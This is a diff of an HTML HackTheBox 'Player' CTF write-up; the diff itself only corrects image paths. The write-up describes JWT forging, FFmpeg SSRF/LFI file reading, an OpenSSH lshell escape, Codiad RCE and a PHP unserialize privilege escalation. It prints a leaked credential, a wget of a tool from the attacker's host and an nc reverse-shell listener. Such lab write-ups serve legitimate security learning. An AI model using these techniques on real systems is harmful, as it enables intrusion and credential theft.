@@ -13,7 +13,7 @@
             <div class="top">
                 <center>
                     <h1>Hackthebox Player Writeup</h1>
-                    <img src="Player/Player/writeup-images/1.png" width="500px">
+                    <img src="writeup-images/1.png" width="500px">
                 </center>  
             </div>
         </div><br>
@@ -46,40 +46,40 @@
 <br>
 <h1>Enumeration:</h1>
 <h4>Firstly, i checked the http port 80 and i got a forbidden page, and I run gobuster tool to bruteforce directorys .</h4><br>
-<img src="Player/Player/writeup-images/2.png" width="700px">
+<img src="writeup-images/2.png" width="700px">
 <br>
 <h4>I found /launcher with 301 code , open an application named playBuf.</h4><br><br>
-<img src="Player/Player/writeup-images/7.png" width="700px"><br><br>
-<img class="images" src="Player/Player/writeup-images/3.png" width="700px"><br>
+<img src="writeup-images/7.png" width="700px"><br><br>
+<img class="images" src="writeup-images/3.png" width="700px"><br>
 <h4>I checked the feature in the application with Burpsuite .</h4><br><br>
-<img src="Player/Player/writeup-images/4.png" width="700px"><br>
+<img src="writeup-images/4.png" width="700px"><br>
 <h4>I found that ( Send ) button make a get request to another page that have JWT and then redirect us to index.html, so I tried to see the JWT with ( https://jwt.io ).</h4><br>
-<img src="Player/Player/writeup-images/5.png" width="700px"><br>
+<img src="writeup-images/5.png" width="700px"><br>
 <h4>After alot of enumeration I found a backup of this page http://10.10.10.145/launcher/dee8dc8a47256c64630d803a4c40786c.php~, and have the code that generate JWT and decode it.</h4><br>
-<img src="Player/Player/writeup-images/6.png" width="700px"><br>
+<img src="writeup-images/6.png" width="700px"><br>
 <h4>I start analyzing the php code , they replace the " _ " in key with "/" and then base64 decode.</h4><br>
-<img src="Player/Player/writeup-images/7.png" width="700px"><br>
+<img src="writeup-images/7.png" width="700px"><br>
 <h4>As a first step I know what the code do , then there's a check if the access_code in access variable in cookie match this "0E76658526655756207688271159624026011393" with redirect us to a new directory , we make a simple php code that change the access_code and encrypt it with the right key.</h4><br>
-<img src="Player/Player/writeup-images/8.png" width="700px"><br>
+<img src="writeup-images/8.png" width="700px"><br>
 <h4>After running the code I got the new JWT.</h4><br>
-<img src="Player/Player/writeup-images/9.png" width="700px"><br>
+<img src="writeup-images/9.png" width="700px"><br>
 <h4>I changed the token and send it to dee8dc8a47256c64630d803a4c40786c.php, then redirect me to new directory 7F2dcsSdZo6nj3SNMTQ1/ with new application.</h4><br>
-<img src="Player/Player/writeup-images/10.png" width="700px"><br>
+<img src="writeup-images/10.png" width="700px"><br>
 <h4>After I make some enumeration I found it's ffmpeg software ( open-soucre project used for processing audio and video formats ) , there's SSRF exploit in this software this is good report from hackerone. ** <a href="https://hackerone.com/reports/115978">https://hackerone.com/reports/115978 </a>**
 
 After installing the script that generate the .avi file to make LFI (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/CVE Ffmpeg HLS</a>) I uploaded the .avi file to the system.</h4><br>
-<img src="Player/Player/writeup-images/11.png" width="700px"><br>
+<img src="writeup-images/11.png" width="700px"><br>
 <h4>By clicking on "Buffed Media" and downloading the .avi file , and here's the magic I got passwd for the server.</h4><br>
-<img src="Player/Player/writeup-images/12.png" width="700px"><br>
-<img src="Player/Player/writeup-images/13.png" width="700px"><br>
+<img src="writeup-images/12.png" width="700px"><br>
+<img src="writeup-images/13.png" width="700px"><br>
 <h4>- I installed a script to bruteforce vhosts make some filter with status code and content length and i found 2 vhosts.
 <br>
 <code>ruby scan.rb --ip=10.10.10.145 --host=player.htb</code><br><br>
 * dev.player.htb , staging.player.htb *</h4><br>
-<img src="Player/Player/writeup-images/14.png" width="700px"><br><br>
-<img src="Player/Player/writeup-images/15.png" width="700px"><br>
+<img src="writeup-images/14.png" width="700px"><br><br>
+<img src="writeup-images/15.png" width="700px"><br>
 <h4>I found that there are some error messages on some features, after checking all pages and try all features , there's error message in contact.php</h4><br>
-<img src="Player/Player/writeup-images/16.png" width="700px"><br>
+<img src="writeup-images/16.png" width="700px"><br>
 <h4>
 I found two file in the server , I will read it using ssrf exploit (FFmpeg)<br><br>
 
@@ -87,34 +87,34 @@ I found two file in the server , I will read it using ssrf exploit (FFmpeg)<br><
 
 I got creds from /var/www/backup/service_config<br>
 </h4><br>
-<img src="Player/Player/writeup-images/17.png" width="700px"><br>
+<img src="writeup-images/17.png" width="700px"><br>
 <h4>I tried this credentials into ssh and I got lshell or ( limited shell ).</h4><br>
-<img src="Player/Player/writeup-images/18.png" width="700px"><br>
+<img src="writeup-images/18.png" width="700px"><br>
 <h4>I searched for exploit OpenSSH 7.2 and I found an exploit.</h4><br>
-<img src="Player/Player/writeup-images/19.png" width="700px"><br>
+<img src="writeup-images/19.png" width="700px"><br>
 <h4>After running the script I got shell access as user.</h4><br>
-<img src="Player/Player/writeup-images/20.png" width="700px"><br>
+<img src="writeup-images/20.png" width="700px"><br>
 <h4>I read the fix.php file that i not read it , and I got a new credentials : peter:CQXpm\z)G5D#%S$y=</h4><br>
 <h4>- After a lot of enumeration and trying this creds in ssh with no success, I found that creds valid on http://dev.player.htb/ , and open for us a new system.</h4><br>
-<img src="Player/Player/writeup-images/21.png" width="700px"><br>
+<img src="writeup-images/21.png" width="700px"><br>
 <h4>After some search and digging into source code I found what is this:</h4><br>
-<img src="Player/Player/writeup-images/22.png" width="700px"><br>
+<img src="writeup-images/22.png" width="700px"><br>
 <h4>- I found a word ( codiad ) and I searched about it in google and found Codiad RCE</h4><br>
 <a href="https://github.com/WangYihang/Codiad-Remote-Code-Execute">https://github.com/WangYihang/Codiad-Remote-Code-Execute-</a>
 <h4>I tryied it and worked with Peter credsa and I got a shell.</h4><br>
-<img src="Player/Player/writeup-images/23.png" width="700px"><br><br>
-<img src="Player/Player/writeup-images/24.png" width="700px"><br>
+<img src="writeup-images/23.png" width="700px"><br><br>
+<img src="writeup-images/24.png" width="700px"><br>
 <h4>After getting a reverse shell I tried to switch user to telegen, but there's lshell. So, I searched how to bypass this and I found there’s option with:</h4><br>
 <code>* su telegen -s /bin/bash</code><br><br>
-<img src="Player/Player/writeup-images/25.png" width="700px"><br>
+<img src="writeup-images/25.png" width="700px"><br>
 <h4>After an hour i decided to get pspy64 to see the processes and I found there's cronjob run by root in interesting path :</h4><br>
 <code>
     * python -m SimpleHTTPServer 80<br>
     * wget http://10.10.14.20/pspy64
 </code><br><br>
-<img src="Player/Player/writeup-images/26.png" width="700px"><br>
+<img src="writeup-images/26.png" width="700px"><br>
 <h4>I checked /var/lib/playbuff directory to see what on it .</h4><br>
-<img src="Player/Player/writeup-images/27.png" width="700px"><br>
+<img src="writeup-images/27.png" width="700px"><br>
 <h4>After that, I saw the buff.php , it's use serializtion. Good link for this type of attack:</h4><br>
 <a href="https://www.notsosecure.com/remote-code-execution-via-php-unserialize/">remote-code-execution-via-php-unserialize</a><br><br>
 <h4>-there's two way to got root :</h4>
@@ -133,7 +133,7 @@ I got creds from /var/www/backup/service_config<br>
         - wait 1 min
         - sudo -l
 </pre>
-<img src="Player/Player/writeup-images/29.png" width="700px"><br>
+<img src="writeup-images/29.png" width="700px"><br>
 <h2>** Method 2: via edit database file</h2>
 <pre>
     Payload:
@@ -141,7 +141,7 @@ I got creds from /var/www/backup/service_config<br>
     - nc -lvp 9909
     - wait 1 min
 </pre><br>
-    <img src="Player/Player/writeup-images/30.png" width="700px">
+    <img src="writeup-images/30.png" width="700px">
     <br><br><br><br><br>
     <h4>By M4Rv3L -HackTheBox</h4>
     <br>
